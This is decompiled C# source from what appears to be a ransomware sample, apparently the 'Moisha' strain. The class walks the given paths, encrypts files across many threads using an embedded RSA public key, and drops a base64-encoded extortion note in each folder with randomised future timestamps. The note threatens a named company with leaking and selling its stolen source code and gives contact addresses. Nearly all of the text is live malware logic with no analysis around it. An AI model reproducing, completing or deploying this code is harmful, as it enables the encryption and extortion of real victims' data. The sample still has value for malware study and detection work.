// Decompiled with JetBrains decompiler
// Type: A.a
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using MOISHE.Core;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace A
{
  internal class a
  {
    private BlockingCollection<string> A;
    private List<EncryptionConsumer> A;
    private KeyGenerator A;
    private List<string> A;
    private int A;
    private List<string> a;
    private const string A = "MIICCgKCAgEAymA9dRumxsjTrSowf1gLVxMPDLXE2XzQUZTQgCdTfZzL33jA0iS4gosxIPk57tCk\r\nur8Kt/lh9Ac6Wq7snMptzFBNte5QLktwl07vPnwqynsqwv3uWVe9aQXJgQ/lzbs/fSlwcshFNzJV\r\npqOpqYWRK0YXp3z4IC+FpzK6A1SMEgo/Iru+EArcEtE9zjCH3N1BBJes2O8y1MqirKfZDM4SifQD\r\nZ8GThBaHtWvP0DkKn3rkHEY0hLof5eCei8+7JEEvVrFAfKg6fjelzyc/9bAOd1K/xBDVr4KO9i0h\r\nXyJIWokMMoZBbbQqTH4sxzPV9G1Hx5smYu/tfy8/QHIBL9BVzTO3IvNsCiGWyd0fKOLX/IclqtYH\r\nzm5Sm1DnMXsPcM1TEahu0dCXGt6mEUkmkpsV0dcP5VVZE4lb2ObPSco0l9xgzQUbTHh4OOHYBLo7\r\nizT+uLsuVRHYqteFFkO094zbx0ILknyeEfm/vO+XP2DA3uqBd+lDR/QyLzIizhv7qASQVy1sLIYV\r\nDFy2AvFVIkQBiQ+ywekhfNveNrHRp7oZ+AYxADhITmsjt5E1GycHNR+xv6ABW2V2uuhVbF+E4XNv\r\nMzrZng8hWXvvKN0iAT//fTDw4UXJl9lShKstja9OUvjBb7ht/O5JBFUVt+39VWyfHk7ivxtLakmf\r\nChOjI+O4hP0CAwEAAQ==";
    private const string a = "DQoNCiAgICAgICAgICAgICAgIyN+fn4jfn5+fn4jIyMjfn5+fn4jIyMjIyN+fn5+fiMjIyN+fn5+fiMjfn4jI35+fn5+IyMjI34NCiAgICAgICAgICAgICAgIyMjfiMjfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+IyN+fn5+fn5+fiMjfn4jI35+fn4jI35+IyMNCiAgICAgICAgICAgICAgIyN+I34jfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+fiMjIyN+fn5+fiMjIyMjI35+fn4jIyMjIyMNCiAgICAgICAgICAgICAgIyN+fn4jfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+fn5+fiMjfn5+fiMjfn4jI35+fn4jI35+IyMNCiAgICAgICAgICAgICAgIyN+fn4jfn5+fn4jIyMjfn5+fn4jIyMjIyN+fn5+fiMjIyN+fn5+fiMjfn4jI35+fn4jI35+IyMNCg0KSGkgSmV3ZWxzIEluZm9zeXN0ZW1zLCB0aGlzIGlzIE1vaXNoYSENCg0KV2hhdCBoYXBwZW5lZD8NCg0KQWxsIGp1c3Qgb3VyIFBvbGVzIFRlc3RlcnMgdGVhbSBwZW5ldHJhdGVkIHlvdXIgbmV0d29yayENCldoYXQgZG8gd2Ugd2FudD8gV2Ugd2FudCBtb25leSBmb3Igb3VyIHNpbGVuY2UgYW5kIGRlY3J5cHRpbmcgeW91ciBmaWxlcyENCg0KV2hhdCBkaWQgd2UgZG8/LCBXZSBlbnRlcmVkIHlvdXIgY29ycG9yYXRlIG5ldHdvcmssIHN0b2xlIHlvdXIgd29yayBmaWxlcyBhbW9uZyB0aGVtIHRoZSBzb3VyY2UgY29kZXMgDQpvZiB5b3VyIHByb2plY3RzISBMZWF2aW5nLCB3ZSBlbmNyeXB0ZWQgdGhlbSwgbW9yZSB0aGFuIHlvdSBhcmUgc3VyZSBvZiB5b3UgaGF2ZSB0aGVpciBjb3B5IQ0KDQpXaGF0IGRvIHdlIGRvPyBXZSB3aWxsIGNvbnRhY3QgeW91ciBldmVyeSBjbGllbnQsIGFuZCBsZXQgdXMgaW5mb3JtIHlvdSB0aGF0IHlvdSB3ZXJlIGhhY2tlZCBhbmQgYWxsIA0KeW91ciBjdXN0b21lcnMgYXJlIG5vdyBhdCByaXNrIHdvcmtpbmcgd2l0aCB0aGUgcHJvZ3JhbXMgb2Ygd2hvc2Ugc291cmNlIGNvZGUgd2UgaGF2ZSENCg0KV2hhdCB0byBkbyB0aGF0IGFsbCB0aGlzIHdvdWxkIG5vdCBiZSBhbmQgcmV0dXJuIGFsbCB0byBwbGFjZXM/DQoNCkFsbCB3ZSBqdXN0IHdhbnQgbW9uZXksIG5hbWVseSA1NS41NTU1IGRvbGxhcnMsIGZvciBvdXIgc2lsZW5jZSBhbmQgZGVjcnlwdGlvbiBvZiB5b3VyIG5ldHdvcmsuDQoNCldoYXQgd2lsbCBoYXBwZW4gaWYgeW91IGRvIG5vdCBnZXQgaW4gdG91Y2g/IDoNCg0KMS4gV2Ugd2lsbCBwdWJsaXNoIHBhcnQgb2YgdGhlIHNvdXJjZSBvZiB5b3VyIHByb2plY3RzICh0aGlzIHdpbGwgY2F1c2UgcmVwdXRhdGlvbmFsIGhhcm0gdG8geW91ciBjb21wYW55KQ0KMi4gV2Ugd2lsbCBzZWxsIHBhcnQgb2YgdGhlIHNvdXJjZXMgdG8geW91ciBjb21wZXRpdG9ycyBvciBhbnlvbmUgd2hvIHdhbnRzIHRvIGJ1eSB0aGVtIQ0KMy4gV2UgYXJlIGtuaXR0ZWQgd2l0aCBldmVyeW9uZSB3aG8gd29ya3Mgd2l0aCB5b3Ugb3IgaGFzIGFueSBjb25uZWN0aW9uIHdpdGggeW91ciBjb21wYW55LCBiZSB5b3VyIA0KcGFydG5lcnMgb3IgY2xpZW50cyBvZiB5b3VyIGNvbXBhbnkuDQo0LiBXZSB3aWxsIHJlcG9ydCB0byByZWdpb25hbCBuZXdzIHRoYXQgeW91IHdlcmUgaGFja2VkIQ0KDQpBbGwgdGhpcyBjYW4gYmUgYXZvaWRlZCwgaG93Pw0KDQoxLiBZb3UgZ2V0IGluIHRvdWNoIHdpdGggdXMuDQoyLiBXZSBhZ3JlZSBpbiB0aGUgZmlyc3QgNDggaG91cnMgaXQgd2lsbCBiZSBmYXN0IQ0KMy4gWW91IHBheSB0aGUgYWdyZWVkIGFtb3VudC4NCjQuIFdlIHJlc3RvcmUgZXZlcnl0aGluZyB0aGF0IHdlIGVuY3J5cHRlZC4NCjUuIFdlIHdpbGwgcmV0dXJuIHlvdXIgc291cmNlIGNvZGVzIHRvIHlvdSBhbmQgd2lsbCBub3QgcHVibGlzaCB0aGVtIG9uIGZvcnVtcyBhbmQgc2VsbCB0aGVtIHRvIHNlY29uZCANCmFuZCB0aGlyZCBwYXJ0aWVzLg0KDQpNYWtlIHN1cmUgdGhhdCB3ZSBhcmUgbm90IHRoZSB0aW1lIHlvdSB3YXNoLCBsb29raW5nIGF0IHRoZSBwcm92aWRlcuKAmXMgcmVwb3J0IGFuZCB1bmRlcnN0YW5kIHRoYXQgYWxsIA0KeW91ciBzb3VyY2VzIGFuZCBwcm9qZWN0cyBtZXJnZWQgZnJvbSB5b3UgISENCg0KV2UgaGF2ZSBkb3dubG9hZGVkIGFsbCB5b3VyIHByb2dyYW0gc291cmNlcyEgb3ZlciAyMDAgZ2lnYWJ5dGVzISBEb24ndCBkZWxheSEgd2UgYXJlIHdhaXRpbmcgZm9yIHlvdSBhdCANCnRoZSBuZWdvdGlhdGlvbnMsIHdlIHdpbGwgYmUgYWJsZSB0byBjb25maXJtIHRoZSBhdmFpbGFiaWxpdHkgb2YgeW91ciBmaWxlcyENCg0KWW91IGNhbiBjb250YWN0IHVzOg0KVG8gcXVpY2tseSBjb21tdW5pY2F0ZSwgdXNlIG1haWwgKFJvYmVydG11bGRlcl8xOTY5QFByb3Rvbi5tZSBIZWZteXJhLTE5NjNAUHJvdG9uLm1lKQ0KDQoNCi0gVXNlIHRoZSBUb3ggTWVzc2VuZ2VyLCBZb3UgQ2FuIGRvd25sb2FkIGhlZXJlIGh0dHBzOi8vdG94LmNoYXQvDQoNCnRvIGNvbXVuaWNhdGUgd2l0aCB0aGUgT3BlcmF0b3IgVmlhIFRveCBNZXNzZW5nZXI6DQoNCk1vaXNoYSBJZCBPcGVyYXRvciBpbiBUb3ggTWVzc2VuZ2VyDQoNCjY5M0U5QjM2NDgwNjc4QzA1NTU1NUExMzUzMzdBNzI5MTNGQTE2RkE3MDQ5MTkxOTE5MTlCQ0VCREZDNjQ3QUNCMEJDQUNGMTYwQUE0MDgzMDQ2NDJCDQoNCg0KDQpTaW5jZXJlbHkgTU9JU0hBICEhDQoNCg0KDQojI35+fiN+fn5+fiMjIyN+fn5+fiMjIyMjI35+fn5+IyMjI35+fn5+IyN+fiMjfn5+fn4jIyMjfn5+fn4jI35+fn5+fiMjIyN+fn4jIyMjfn4jI35+IyMNCiMjI34jI35+fn4jI35+IyN+fn5+fn4jI35+fn5+fiMjfn5+fn5+fn4jI35+IyN+fn5+IyN+fiMjfn5+fiMjfn5+fn4jI35+IyN+IyN+fiMjfiMjfiMjfg0KIyN+I34jfn5+fiMjfn4jI35+fn5+fiMjfn5+fn5+fiMjIyN+fn5+fiMjIyMjI35+fn4jIyMjIyN+fn5+IyN+fn5+fiMjfn4jI34jI35+fn5+IyMjI35+DQojI35+fiN+fn5+IyN+fiMjfn5+fn5+IyN+fn5+fn5+fn5+IyN+fn5+IyN+fiMjfn5+fiMjfn4jI35+fn4jI35+fn5+IyN+fiMjfiMjfn4jI34jI34jI34NCiMjfn5+I35+fn5+IyMjI35+fn5+IyMjIyMjfn5+fn4jIyMjfn5+fn4jI35+IyN+fn5+IyN+fiMjfn5+fiMjIyMjI35+IyMjI35+fiMjIyN+fiMjfn4jIw==";

    public a([In] List<string> obj0_1)
    {
      this.A = 0;
      this.A = obj0_1;
      this.A = AbstractWorker.NewBlockingQueue<string>(50000);
      this.A = new List<EncryptionConsumer>();
      this.a = new List<string>();
      this.B();
      this.A = new KeyGenerator();
      this.A.ImportPublicKeyPEM(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.D());
      int num = Environment.ProcessorCount * 20;
      for (int index = 0; index < num; ++index)
      {
        EncryptionConsumer encryptionConsumer = new EncryptionConsumer(this.A, this.A.NewSession(), this.a);
        encryptionConsumer.OnItem += (RecursorItemSubmittedHandler) (obj0_2 =>
        {
          Interlocked.Decrement(ref this.A);
          try
          {
            A.a.A(new FileInfo(Path.Combine(new FileInfo(obj0_2).Directory.FullName, \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.d())).FullName);
          }
          catch
          {
          }
        });
        this.A.Add(encryptionConsumer);
      }
    }

    public void A()
    {
      foreach (AbstractWorker abstractWorker in this.A)
        abstractWorker.Start();
      foreach (string path in this.A)
      {
        if (path != null && path.Trim().Length != 0)
          FileSystem.RecursePath(path, this.a, this.A, (RecursorItemSubmittedHandler) delegate
          {
            Interlocked.Increment(ref this.A);
          });
      }
      while (this.A > 0)
        Thread.Sleep(50);
      foreach (string path1 in this.A)
        A.a.A(Path.Combine(path1, \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.d()));
      foreach (AbstractWorker abstractWorker in this.A)
        abstractWorker.Cancel();
    }

    private static DateTime a()
    {
      int num = new Random().Next(180, 730);
      DateTime dateTime = DateTime.Now;
      dateTime = dateTime.AddDays((double) num);
      return dateTime;
    }

    private static void A([In] string obj0)
    {
      try
      {
        File.WriteAllBytes(obj0, Convert.FromBase64String(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.E().Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.e(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.f(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.G(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.g(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Trim()));
        DateTime dateTime = A.a.a();
        FileInfo fileInfo = new FileInfo(obj0);
        fileInfo.CreationTime = dateTime;
        fileInfo.LastAccessTime = dateTime;
        fileInfo.LastWriteTime = dateTime;
      }
      catch
      {
      }
    }

    private void B()
    {
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.H());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.h());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.I());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.i());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.J());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.j());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.K());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.k());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.L());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.l());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.M());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.m());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.N());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.n());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.O());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.o());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.P());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.p());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.Q());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.q());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.R());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.r());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.S());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.s());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.T());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.t());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.U());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.u());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.V());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.v());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.W());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.w());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.X());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.x());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.Y());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.O());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.d());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.y());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.Z());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.z());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aA());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aa());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aB());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ab());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aC());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ac());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aD());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ad());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aE());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ae());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aF());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.af());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aG());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ag());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aH());
      this.a.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ah());
    }
  }
}
